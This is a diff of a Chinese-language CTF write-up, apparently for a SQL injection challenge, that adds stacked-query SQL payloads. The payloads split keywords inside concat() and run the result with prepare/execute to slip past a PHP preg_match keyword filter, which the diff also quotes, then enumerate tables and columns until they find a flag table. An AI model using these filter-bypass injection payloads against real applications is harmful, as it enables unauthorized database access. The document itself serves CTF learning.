@@ -13,12 +13,11 @@
 ## 测试select
 
 <img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/og0nm7skwmk.png" width="600px" />
-可以看出存在这个过滤 
+可以看出存在这个过滤
 
 ``` 
 return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 ```
-
 
 
 ## 绕过过滤
@@ -39,21 +38,35 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 <img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/tos36bp1iro.png" width="600px" />
 
 #### 使用堆叠查询，查询当前数据库有几张表
+
 ```sql
 set @sql1=concat('show',' tables');
 prepare stmt from @sql1;
 execute stmt;
 ```
+
+
 注意点就是mysql没有双引号，所以concat中需要使用单引号。同时从运行结果可以知道，一共存在两张表
 <img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/db3th3vdzn9.png" width="600px" />
 
 #### 使用堆叠查询，查询表的字段
 1. 查询1919810931114514
 
+```sql
+use information_schema;
+set @sql1=concat('sel','ect group_concat(column_name) from columns wh','ere table_name=\'1919810931114514\'');
+prepare stmt from @sql1;
+execute stmt;
+```
 
+
+这里值得注意的就是concat函数中，如果还需要加上单引号。
+有以下几种做法：
+1. 需要对单引号使用转义符号。
+2. 使用两个单引号代替一个单引号
+运行结果 存在flag表
+<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/oh0m951g0dm.png" width="600px" />
 #### 使用报错注入获取数据库的名称
 
+####  使用堆叠查询，查询表的内容
 
-```{.python .input}
-
-```
